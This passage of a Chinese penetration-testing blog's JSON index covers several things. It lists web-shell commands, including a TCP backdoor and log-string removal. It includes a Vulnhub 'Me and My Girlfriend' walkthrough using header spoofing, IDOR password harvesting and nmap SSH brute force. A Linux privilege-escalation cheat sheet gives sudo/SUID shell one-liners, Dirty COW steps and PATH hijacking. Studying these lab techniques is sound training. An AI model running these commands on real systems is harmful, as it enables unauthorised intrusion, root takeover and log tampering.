shell.需要nc -lvp 监听\n:file_mount\n使用HTTPfs挂载远程文件系统\n\n\n:backdoor_tcp\n在TCP端口上生成shell\n:file_clearlog\n从文件中删除字符串\n\n\n:net_scan\nTCP端口扫描\n:file_zip\n压缩或解压zip文件\n\n\n:net_mail\n发送邮件\n:file_upload\n文件上载到远程文件系统\n\n\n:net_ifconfig\n获取网络接口地址\n:file_upload2web\n自动将文件上传到Web文件夹并获取相应的URL\n\n\n:net_curl\n执行类似curl的HTTP请求\n:file_edit\n在本地编辑器上编辑远程文件\n\n\n:net_proxy\n运行本地代理以通过目标转移HTTP/HTTPS浏览\n:file_read\n从远程文件系统中读取远程文件\n\n\n:net_phpproxy\n在目标上安装PHP代理\n:file_webdownload\n指定URL下载文件\n\n\n:file_ls\n列出目录内容\n:file_rm\n删除远程文件\n\n\n:sql_dump\nMulti dbms mysqldump replacement\n:sql_console\n执行SQL查询或运行sql控制台\n\n\n\n\n","categories":["渗透测试"],"tags":["Tools"]},{"title":"Vulnhub|Me and My Girlfriend","url":"/6ceb590b.html","content":"0.靶机安装\n使用NAT模式，保证与攻击机kali在同一网段内：\n\n1.信息收集\n主机扫描root@kali:~# nmap 192.168.xxx.0/24开放了ssh(22)和http(80)。\n\n2.(80端口)web安全\n2.1 web访问，查看页面源代码提示利用x-forward-for，在浏览器借助工具在请求头中加入 X-Forward-For:127.0.0.1 ,访问成功：注册一个账号用户登录：使用注册的账户登录：2.2 水平越权点击profile，请求中带有参数user_id：通过编辑user_id，能够获得其他用户的信息,存在水平越权：  \n\n此处可以通过样式编辑器编辑元素类型为text，即可将密码明文显示：  \n\n通过上述操作，可以收集到每个用户对应的账号与密码：\n\n\n\nusername\npassword\n\n\n\n\neweuhtandingan\nskuyatuh\n\n\naingmaung\nqwerty!!!\n\n\nsundatea\nindONEsia\n\n\nsedihaingmah\ncedihhihihi\n\n\nalice\n4lic3\n\n\n\n\n3.(22端口)SSH\n虽然通过2.2收集到的账户与密码，但不知道具有ssh登陆权限的账户密码是哪一个。将账户密码分别存储为uname.txt和passwd.txt：getshell (SSH爆破)root@kali:~# nmap -p 22 --script=ssh-brute --script-args userdb=uname.txt,passdb=passwd.txt 192.168.xxx.xxx获得可用账户密码：alice/4lic3 ：  \n\n使用Xshell远程登陆(ssh登陆的方式很多，直接用 ssh alice@&lt;靶机ip&gt; 也行)  \n\n“我是谁？我在哪？我有啥？”\n\n\n\n口令\n解释\n\n\n\n\nwhoami\n显示当前用户\n\n\npwd\n显示工作路径\n\n\nls -a\n当前目录下所有文件夹及文件\n\n\n\n显示可疑目录.my_secret 进入后 ls -a，查看flag1.txt，文件包含flag，及提示需要获得root权限才能得到另一个flag：  \n\n4.提权\n\n2021-12-01发布的提权相关文章提权sudo提权 (这里尝试sudo提权时发现具有提权条件，故暂不尝试其他提权方式)查询具有sudo权限命令：sudo -l\n尝试使用sudo-php提权(命令的含义我也不太懂，把它当作一种固定的语句吧):  CMD=\"/bin/sh\"  \nsudo php -r \"system('$CMD');\"\n使用 whoami 提权成功：进入 /root 目录，查看文件，找到flag2.txt：  \n\n\n","categories":["渗透测试"],"tags":["Vulnhub","提权","水平越权","SSH爆破"]},{"title":"提权","url":"/e2181504.html","content":"提权途径\n1. sudosudo -l &#x2F;&#x2F;查询具有sudo权限命令\n\n\n2. suid\nSUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。其中，大家熟知的具有提权功能的Linux可执行文件包括：\n\nfind &#x2F; -perm -u&#x3D;s type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;查询具有suid执行权限程序\n可利用的程序：nmap、vim、find、bash、more、less、nano、cp、wget、python、mawk  \n\n\n3. 通过在/etc/passwd添加一个root权限账户find &#x2F; -writable -type f 2&gt;&#x2F;dev&#x2F;null &#x2F;&#x2F;查询可写权限的文件\n\n\n4. 查看/etc/cron*下所含的所有文件ls -la &#x2F;etc&#x2F;cron* &#x2F;&#x2F;cron*是用来让使用者在固定时间或固定时间间隔执行程序之用(类似使用者的时程表),攻击者可根据root执行的程序寻找exp。\n\n提权\n1. php\nsudoCMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;\nsudo php -r &quot;system(&#39;$CMD&#39;);&quot;\nsuidsudo sh -c &#39;cp $(which php) .; chmod +s .&#x2F;php&#39;\nCMD&#x3D;&quot;&#x2F;bin&#x2F;sh&quot;\n.&#x2F;php -r &quot;pcntl_exec(&#39;&#x2F;bin&#x2F;sh&#39;,[&#39;-p&#39;]);&quot;\n\n\n\n\n2. mysql\nsudosudo -u root mysql -e &#39;\\! /bin/bash&#39;  \n\n\n\n3. awk/mawk\nsudosudo /usr/bin/awk &#39;&#123;system(&quot;/bin/bash&quot;)&#125;&#39;  \nsuidmawk &#39;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#39;\n\n\n\n4. python\nsuidpython -c &#39;import os;os.system(&quot;/bin/sh&quot;)&#39;  \n\n\n\n5.脏牛提权\n使用实例：Vulnhub|Lampiao、Vulnhub|Sumo  \n\n把脏牛漏洞扫描器，上传到靶机上。(ssh/wget)\n\nscp 是 secure copy 的缩写, scp 是 linux 系统下基于 ssh 登陆进行安全的远程文件拷贝命令。scp ~/dirtycowscan.sh &lt;ssh_user&gt;@&lt;目标ip&gt;:&lt;目标路径&gt;  \n\n攻击机开启apache，把需要传输的文件放到 /var/www/html。靶机要在 /tmp才有 wget权限!!!。wget http://192.168.117.129/dirtycowscan.sh   \n\n\n靶机运行脏牛漏洞扫描脚本./dirtycowscan.sh，查看返回结果是否IS vulnerable。查看靶机的编译环境gcc -v、g++ -v……；在攻击机找expsearchsploit dirty，找到对应合适的脚本，同样用scp或wget将 /usr/share/exploits/&lt;脚本所在path&gt; 传到靶机上。在靶机上编译运行脚本：  \n\n编译源代码：cat &lt;上传的脚本&gt; | grep g++–找到编译语句，如g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil进行编译。运行编译成的文件：如./dcow。  \n\n\n6.劫持环境变量提权\n\n使用实例：Vulnhub|DarkHole1  \n\n\n概念：可通过$PATH查看当前系统下的环境变量，$PATH(一定是大写)这个变量的内容是由一堆目录所组成的，每个目录中间用冒号(:)来隔开，每个目录是有顺序的由左至右，优先级变低，新增的目录置于最左侧。条件：存在可执行文件为系统命令 (因为system函数是继承环境变量，通过替换环境变量可以达到执行任意命令)，且具有s权限 (s权限： 设置使文件在执行阶段具有文件所有者的权限，相当于临时拥有文件所有者的身份)，且uid为关键用户。  \n\n操作：（以系统命令id为例）创建一个id命令文件并赋权：echo &quot;/bin/bash&quot;&gt;/tmp/id &amp;&amp; chmod 777 id把当前目录/tmp增加到环境变量中：export PATH=/tmp:$PATH环境变量PATH设置后，执行id命令时会优先从/tmp下查找程序，故id命令会被劫持(即期望执行的是id，但实际执行的是id文件中的命令/bin/bash)。过程：其他用户执行可执行文件(./xxx)-执行系统命令(id)-以uid的身份执行恶意命令(/bin/bash)-获得uid身份的shell。  \n\n","categories":["渗透测试"],"tags":["提权"]},{"title":"Stay sharp, stay alone.","url":"/b822f9c7.html","content":"以前从别人那听来的一段话：“Your time and energy are scarce resources. Do not waste them on trivial people or things. Do not answer unjustified questions, or reply curious comments. Ignore them all. Spend more time with wise peers. Read sparkling thoughts on books. Stay sharp, stay alone. “\n","categories":["随记"],"tags":[]}]